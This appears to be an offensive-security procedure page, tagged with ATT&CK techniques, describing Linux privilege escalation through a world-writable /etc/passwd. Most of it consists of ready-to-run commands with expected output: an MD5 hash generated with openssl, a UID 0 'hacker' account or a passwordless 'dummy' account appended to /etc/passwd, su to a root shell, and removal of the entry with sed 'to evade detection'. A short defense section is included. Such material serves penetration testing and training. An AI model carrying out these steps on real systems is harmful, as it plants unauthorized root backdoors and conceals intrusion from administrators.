---
type: procedure
description: >-
  Escalate privileges on a Linux system by exploiting writable /etc/passwd to
  create a new root-equivalent user account.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Create Account|T1136 - Create Account]]'
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
sub_techniques: []
tags:
  - linux-privilege-escalation
  - writable-etc-passwd
  - account-creation
commands:
  - '[[commands/check-etc-passwd-permissions]]'
  - '[[commands/generate-md5-password-hash]]'
  - '[[commands/add-user-to-etc-passwd-with-hash]]'
  - '[[commands/add-dummy-user-to-etc-passwd]]'
  - '[[commands/su-to-user]]'
  - '[[commands/view-etc-passwd]]'
platforms:
  - Linux
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Linux-Privilege-Escalation-via-Writable-etc-passwd

## Summary

This procedure exploits a misconfiguration where the /etc/passwd file is writable by non-root users to create a new user account with UID 0 (root privileges). The attacker can then switch to this account to gain elevated access, allowing execution of commands as root. This is a classic Linux privilege escalation technique effective on systems without proper file permissions.

## Description

On Linux systems, the /etc/passwd file stores user account information, including usernames, UIDs, GIDs, home directories, and shells. Normally, this file is writable only by root (permissions 644). If it is writable by others (e.g., 666 due to misconfiguration), an attacker with low-privilege shell access can append a new entry for a user with UID 0, effectively creating a backdoor root account. Two methods are covered: one using a known password hash for authenticated access, and a quicker method creating a passwordless account. This technique evades some detection since it modifies a standard system file without introducing new binaries. It applies to most Unix-like systems but is tested on standard Linux distributions like Ubuntu and CentOS. Success grants full root access for persistence, data exfiltration, or further lateral movement.

## Requirements

1. Low-privilege shell access on the target Linux system (e.g., via initial foothold).
2. /etc/passwd file must be writable by the current user (verified in Step 1).
3. Basic knowledge of Linux commands; no additional tools required beyond built-in utilities like echo, openssl, and su.
4. For the hashed password method, openssl or equivalent must be available for hash generation.

## Defense

- Ensure /etc/passwd has strict permissions (644, owned by root:root) using chmod and chown; regularly audit with find /etc -perm -o+w.
- Use shadow passwords exclusively (/etc/shadow owned by root, mode 600) to store hashes, making /etc/passwd non-writable.
- Monitor file integrity with tools like AIDE or Tripwire for changes to /etc/passwd.
- Enable logging of su/sudo attempts and file modifications via auditd; alert on UID 0 account creations.
- Implement mandatory access controls like SELinux or AppArmor to restrict shell access and file writes.

## Objectives

1. Verify exploitability by checking /etc/passwd writability.
2. Create a new root-equivalent user account via file modification.
3. Gain elevated shell access using the new account.
4. Maintain persistence through the backdoor account.

## Instructions

### Step 1: Check /etc/passwd Permissions

**Context**: Confirm the file is writable, as this is the prerequisite for exploitation. If not writable, this technique cannot proceed; consider other privesc vectors like SUID binaries.

**Command** ([[commands/check-etc-passwd-permissions]]):
```bash
ls -la /etc/passwd
```

> This lists the file's permissions and ownership. Look for 'w' in the group or other permissions (e.g., -rw-rw-rw-). If only root can write, abort.

**Expected Output**:
```
-rw-rw-rw- 1 root root 1234 Oct 1 12:00 /etc/passwd
```
Success if the current user can write (test with echo 'test' >> /etc/passwd and verify).

### Step 2: Generate Password Hash

**Context**: For the authenticated method, create an MD5 hash of a known password to include in the new user entry. This allows login with a password. Use a strong but memorable password like 'hacker' for testing.

**Command** ([[commands/generate-md5-password-hash]]):
```bash
openssl passwd -1 -salt hacker hacker
```

> Generates an MD5 hash with salt 'hacker' for password 'hacker'. Replace 'hacker' with desired salt and password. Copy the output hash (e.g., $1$hacker$abc123def).

**Expected Output**:
```
$1$hacker$abc123def456ghi789
```
If openssl is unavailable, alternative methods like mkpasswd or Python crypt can be used (see related code for variants).

### Step 3: Add User with Known Password to /etc/passwd

**Context**: Append a new entry for a root-equivalent user (UID/GID 0) using the generated hash. This creates an account that can su to root privileges. Use a unique username to avoid conflicts.

**Command** ([[commands/add-user-to-etc-passwd-with-hash]]):
```bash
echo 'hacker:$1$hacker$abc123def456ghi789:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

> Replace the hash with your generated one. The format is username:hash:UID:GID:comment:home:shell. UID/GID 0 grants root access. Verify addition with cat /etc/passwd.

**Expected Output**: No output on success; error if not writable. New line appears in /etc/passwd.
If the system uses shadow passwords strictly, you may need to add a shadow entry too, but this works on many misconfigured systems.

### Step 4: Alternative - Add Passwordless Dummy User

**Context**: For immediate access without hashing, create a user with an empty password field (::). This allows passwordless su, but is riskier as anyone can guess it.

**Command** ([[commands/add-dummy-user-to-etc-passwd]]):
```bash
echo 'dummy::0:0:Dummy:/root:/bin/bash' >> /etc/passwd
```

> Appends a passwordless root user. No hash needed. Immediately usable.

**Expected Output**: No output; verify with [[commands/view-etc-passwd]].

### Step 5: Switch to the New User

**Context**: Use su to elevate to the new account. For passwordless, no prompt; for hashed, enter the password used (e.g., 'hacker'). This grants root shell.

**Command** ([[commands/su-to-user]]):
```bash
su hacker
```

> Prompts for password if set. On success, prompt changes to # (root). Run id to confirm UID 0.

**Expected Output**:
```
Password: 
# id
uid=0(root) gid=0(root) groups=0(root)
```
If failed, check entry syntax and permissions.

### Step 6: Verify Users and Cleanup (Optional)

**Context**: Review the /etc/passwd changes to confirm success. In a real engagement, remove the entry post-exploitation to evade detection.

**Command** ([[commands/view-etc-passwd]]):
```bash
cat /etc/passwd
```

> Displays all users; look for your added entry.

**Expected Output**: List of users including the new one, e.g.,
```
hacker:$1$hacker$...:0:0:Hacker:/root:/bin/bash
```
To cleanup: sed -i '/hacker/d' /etc/passwd
